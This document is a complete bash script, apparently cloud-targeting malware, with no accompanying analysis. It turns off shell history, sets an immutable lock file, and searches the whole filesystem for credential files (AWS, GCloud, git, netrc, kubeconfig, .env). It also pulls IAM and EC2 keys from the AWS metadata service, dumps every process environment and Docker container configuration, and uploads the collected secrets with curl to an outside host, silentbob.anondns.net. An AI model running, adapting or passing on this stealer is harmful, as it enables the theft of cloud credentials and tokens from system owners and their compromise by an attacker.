#!/bin/bash
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin:$HOME/.local/bin
export LC_ALL=C.UTF-8 2>/dev/null;export LANG=C.UTF-8 2>/dev/null
export LC_ALL=en_US.UTF-8 2>/dev/null
export HISTFILE=/dev/null;HISTSIZE=0;unset HISTFILE
if [ -z "$HOME" ];then export HOME=/tmp;fi
if [ ! -d "$HOME" ];then mkdir -p $HOME;fi
trap notraces 1 3 9

SRCURL="http://silentbob.anondns.net"

LOCK_FILE="/tmp/..a.l"
TIME_1_OUT=90
SEARCHDEPT="23"

TIME_1_OUT="13"
TIME_2_OUT="26"

CSOF="/tmp/$RANDOM"
EDIS="/tmp/$RANDOM$RANDOM"
touch $CSOF


CRED_FILE_NAMES=(\
 "authinfo2" "access_tokens.db" "" ".smbclient.conf" ".smbcredentials" ".samba_credentials" \
".pgpass" "secrets" ".boto" ".netrc" "netrc" ".git-credentials" "api_key" "censys.cfg" \
"ngrok.yml" "filezilla.xml" "recentservers.xml" "queue.sqlite3" "servlist.conf" "accounts.xml"\
"kubeconfig" "adc.json" "azure.json" "clusters.conf" "docker-compose.yaml" ".env")


MIXED_CREDFILES=("redis.conf.not.exist")



AWS_CREDS_FILES=("credentials" ".s3cfg" ".passwd-s3fs" ".s3backer_passwd" ".s3b_config" "s3proxy.conf")

GCLOUD_CREDS_FILES=("config_sentinel" "gce" ".last_survey_prompt.yaml" "config_default" "active_config" "credentials.db" "access_tokens.db" ".last_update_check.json" ".last_opt_in_prompt.yaml" ".feature_flags_config.yaml" "adc.json" "resource.cache")

AZURE_CREDS_FILES=("")





function get_docker(){
if type docker 2>/dev/null 1>/dev/null; then
echo -e '\n-------- DOCKER CREDS -----------------------------------' >> $CSOF
docker inspect $(docker ps -aq) 2>/dev/null >> $CSOF
fi
}



function cred_files(){

echo -e '\n-------- CREDS FILES -----------------------------------' >> $CSOF

for CREFILE in ${AWS_CREDS_FILES[@]}; do 
echo "searching for $CREFILE"
find / -maxdepth $SEARCHDEPT -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS 
cat $EDIS >> $CSOF
rm -f $EDIS
done

for CREFILE in ${GCLOUD_CREDS_FILES[@]}; do 
echo "searching for $CREFILE"
find / -maxdepth $SEARCHDEPT -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS 
cat $EDIS >> $CSOF
rm -f $EDIS
done

for CREFILE in ${CRED_FILE_NAMES[@]}; do 
echo "searching for $CREFILE"
find / -maxdepth $SEARCHDEPT -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS 
cat $EDIS >> $CSOF
rm -f $EDIS
done

}





function get_azure(){
echo -e '\n-------- AZURE DATA --------------------------------------' >> $CSOF
if [ -z "$AZURE_CREDENTIAL_FILE" ]; then cat $AZURE_CREDENTIAL_FILE >> $CSOF ; fi
if [ -z "$AZURE_GUEST_AGENT_CONTAINER_ID" ]; then echo $AZURE_GUEST_AGENT_CONTAINER_ID  >> $CSOF ; fi
if [ -z "$AZURE_CLIENT_ID" ]; then echo $AZURE_CLIENT_ID >> $CSOF ; fi
if [ -z "$AZURE_CLIENT_SECRET" ]; then echo $AZURE_CLIENT_SECRET >> $CSOF ; fi
if [ -z "$AZURE_TENANT_ID" ]; then echo $AZURE_TENANT_ID >> $CSOF ; fi
if [ -z "$AZURE_SUBSCRIPTION_ID" ]; then echo $AZURE_SUBSCRIPTION_ID >> $CSOF ; fi

}


function get_google(){
echo -e '\n-------- GOOGLE DATA --------------------------------------' >> $CSOF
if [ -z "$GOOGLE_API_KEY" ]; then echo $GOOGLE_API_KEY  >> $CSOF ; fi
if [ -z "$GOOGLE_DEFAULT_CLIENT_ID" ]; then echo $GOOGLE_DEFAULT_CLIENT_ID  >> $CSOF ; fi
if [ -z "$GOOGLE_DEFAULT_CLIENT_SECRET" ]; then echo $GOOGLE_DEFAULT_CLIENT_SECRET  >> $CSOF ; fi
}






########################################################################

function run_aws_grabber(){
get_aws_infos
get_aws_meta
get_aws_env
get_awscli_data
}



function get_aws_infos(){
AWS_INFO=$(timeout -s SIGKILL $TIME_1_OUT curl -sLk http://169.254.169.254/latest/meta-data/iam/info | tr '\0' '\n')
AWS_1_EC2=$(timeout -s SIGKILL $TIME_1_OUT curl -sLk http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\0' '\n')
AWS_1_IAM_NAME=$(timeout -s SIGKILL $TIME_1_OUT curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/)
}

function get_aws_meta(){

if [ ! -z "$AWS_INFO" ]; then echo -e '\n-------- AWS INFO ------------------------------------------' >> $CSOF
echo $AWS_INFO | sed 's/,/\n/g' | sed 's/ }//g' | grep 'InstanceProfileId\|InstanceProfileArn' | \
sed 's# "InstanceProfileArn" : "#InstanceProfileArn : #g' | sed 's# "InstanceProfileId" : "#InstanceProfileId  : #g' |sed 's/"//g' >> $CSOF
fi


if [ ! -z "$AWS_1_EC2" ]; then echo -e '\n-------- EC2 USERDATA -------------------------------------------' >> $CSOF
echo $AWS_1_EC2 | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | \
sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | \
sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | \
sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi


if [ ! -z "$AWS_1_IAM_NAME" ]; then
AWS_1_IAM=$(timeout -s SIGKILL $TIME_2_OUT curl -sLk http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_1_IAM_NAME | tr '\0' '\n')
if [ ! -z "$AWS_1_IAM" ]; then echo -e '\n-------- IAM USERDATA -------------------------------------------' >> $CSOF
echo $AWS_1_IAM | sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | \
sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | \
sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | \
sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi
fi

}

function get_aws_env(){
echo -e '\n-------- AWS ENV DATA --------------------------------------' >> $CSOF

if [ ! -z "$AWS_ACCESS_KEY_ID" ] || [ ! -z "$AWS_SECRET_ACCESS_KEY" ] || [ ! -z "$AWS_SESSION_TOKEN" ] || [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ] || [ ! -z "$AWS_CONFIG_FILE" ] || [ ! -z "$AWS_DEFAULT_REGION" ] || [ ! -z "$AWS_REGION" ] || [ ! -z "$AWS_EC2_METADATA_DISABLED" ] || [ ! -z "$AWS_ROLE_ARN" ] || [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ] || [ ! -z "$AWS_ROLE_SESSION_NAME" ] || [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then

if [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then 
timeout -s SIGKILL $TIME_2_OUT curl -sLk http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  | \
sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | \
sed 's#"AccessKeyId":"#aws configure set aws_access_key_id #g' | \
sed 's#"SecretAccessKey":"#aws configure set aws_secret_access_key #g' | \
sed 's#"Token":"#aws configure set aws_session_token #g'| \
sed 's#"Expiration":"#\nExpiration:  #g'| sed 's/"//g' >> $CSOF
fi

if [ ! -z "$AWS_ACCESS_KEY_ID" ]; then echo "AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID" >> $CSOF ; fi
if [ ! -z "$AWS_SECRET_ACCESS_KEY" ]; then echo "AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY" >> $CSOF ; fi
if [ ! -z "$AWS_SESSION_TOKEN" ]; then echo "AWS_SESSION_TOKEN : $AWS_SESSION_TOKEN" >> $CSOF ; fi
if [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ]; then echo "AWS_SHARED_CREDENTIALS_FILE : $AWS_SHARED_CREDENTIALS_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_CONFIG_FILE" ]; then echo "AWS_CONFIG_FILE : $AWS_CONFIG_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_DEFAULT_REGION" ]; then echo "AWS_DEFAULT_REGION : $AWS_DEFAULT_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_REGION" ]; then echo "AWS_REGION : $AWS_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_EC2_METADATA_DISABLED" ]; then echo "AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_ARN" ]; then echo "AWS_ROLE_ARN : $AWS_ROLE_ARN" >> $CSOF ; fi
if [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then echo "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_SESSION_NAME" ]; then echo "AWS_ROLE_SESSION_NAME : $AWS_ROLE_SESSION_NAME" >> $CSOF ; fi

fi

}

function get_awscli_data(){
aws sts get-caller-identity  >> $CSOF
}



function get_prov_vars(){
echo -e '\n-------- PROC VARS -----------------------------------' >> $CSOF
cat /proc/*/env* 2>/dev/null | tr '\0' '\n' 2>/dev/null | sort -u 2>/dev/null  >> $CSOF
}









send_data(){
curl -F "username=1234" -F "password=5678" -F \
"Datei=@"$CSOF"" -F "Send=1" $SRCURL/insert/keys.php
}











if [ ! -f "$LOCK_FILE" ]; then
touch $LOCK_FILE 2>/dev/null 1>/dev/null
chattr +i $LOCK_FILE 2>/dev/null 1>/dev/null






if type aws 2>/dev/null 1>/dev/null; then
run_aws_grabber
fi

cred_files

get_prov_vars

get_azure
get_google

get_docker


send_data








else

echo "no dubble"

fi

